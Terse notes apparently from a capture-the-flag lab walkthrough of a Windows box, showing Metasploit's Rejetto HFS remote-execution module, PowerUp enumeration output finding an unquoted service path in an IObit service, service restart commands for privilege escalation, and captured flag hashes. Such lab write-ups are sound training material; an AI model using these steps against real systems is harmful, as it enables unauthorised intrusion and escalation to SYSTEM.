# Steel_Mountains 

> VOiD | Friday 30 July 2021 12:02:01 AM IST

My IP : 10.17.6.109
Target IP : 10.10.202.66



meterpreter > cat user.txt
b04763b6fcf51fcd7c13abc7db4fd365

Rejetto HTTP File Server

To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
```bash

msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.64.5
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
load powershell and then powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


Target 
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths




sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9

9af5f314f57607c00fd09803a587db80
```



